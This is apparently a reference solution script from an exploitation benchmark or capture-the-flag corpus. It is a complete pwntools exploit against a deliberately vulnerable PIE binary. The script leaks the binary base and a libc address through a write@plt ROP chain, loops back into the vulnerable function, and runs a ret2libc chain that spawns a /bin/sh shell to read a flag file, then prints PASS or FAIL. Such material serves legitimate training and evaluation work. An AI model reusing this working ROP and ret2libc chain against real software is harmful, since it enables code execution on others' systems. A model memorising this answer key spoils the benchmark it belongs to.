#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
03_pie_write_leak_ret2libc.

Technique: PIE self-leak (raw 8-byte binary write(), not textual %p) ->
GOT leak via write@plt(1, &puts_got, 8) (a clean, full 8-byte leak with no
NUL-truncation dependency, unlike a puts()-based leak) -> ret2libc
system("/bin/sh"). vuln() is called only once from main(); round 2 is
reached by the round-1 chain returning directly to `&vuln` (self-loop),
not by a second source-level call site.

Offset to the saved return address (cyclic pattern + corefile): 88 bytes.

Round-1 chain: pop_rdi(1) ; pop_rsi_rdx(&puts_got, 8) ; write@plt ; &vuln.
Round-2 chain: pop_rdi(&"/bin/sh") ; system. NOTE: no stack-alignment
"bare ret" filler is needed (or wanted) here -- empirically, adding one
lands do_system()'s internal `movaps %xmm1,(%rsp)` on a misaligned rsp
and crashes; 0 or 2 fillers work, odd counts don't. This is because
round 2 is entered via a `ret`-based self-loop (one extra stack pop
relative to a plain single-overflow entry), which flips the alignment
parity relative to round 1's targets 02/07/15.

Run directly:
    python3 03_pie_write_leak_ret2libc_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "03_pie_write_leak_ret2libc")
BINARY = os.path.join(TARGET_DIR, "pie_write_leak_ret2libc")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

context.arch = "amd64"
context.log_level = "error"

OFFSET_TO_RETADDR = 88


def exploit():
    elf = ELF(BINARY, checksec=False)
    libc = ELF(LIBC_PATH, checksec=False)

    io = process(elf.path, cwd=TARGET_DIR)

    io.recvline()  # banner
    self_leak = io.recvn(8)  # raw 8-byte &vuln leak
    io.recvline()  # trailing newline

    base = u64(self_leak) - elf.symbols["vuln"]
    pop_rdi = base + elf.symbols["pop_rdi_gadget"]
    pop_rsi_rdx = base + elf.symbols["pop_rsi_rdx_gadget"]
    write_plt = base + elf.plt["write"]
    puts_got = base + elf.got["puts"]
    vuln_addr = base + elf.symbols["vuln"]

    # Round 1: leak puts's real libc address via write@plt(1, &puts_got, 8),
    # then loop back into vuln() for round 2.
    payload1 = b"A" * OFFSET_TO_RETADDR
    payload1 += p64(pop_rdi) + p64(1)
    payload1 += p64(pop_rsi_rdx) + p64(puts_got) + p64(8)
    payload1 += p64(write_plt)
    payload1 += p64(vuln_addr)
    io.send(payload1)

    puts_addr = u64(io.recvn(8))
    libc_base = puts_addr - libc.symbols["puts"]

    io.recvn(8)   # vuln()'s fresh self-leak for this round (unused)
    io.recvline()

    system_addr = libc_base + libc.symbols["system"]
    binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

    # Round 2: ret2libc system("/bin/sh"). No alignment filler here --
    # see module docstring.
    payload2 = b"A" * OFFSET_TO_RETADDR
    payload2 += p64(pop_rdi) + p64(binsh_addr)
    payload2 += p64(system_addr)
    io.send(payload2)

    io.sendline(b"cat flag.txt")
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 03_pie_write_leak_ret2libc: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
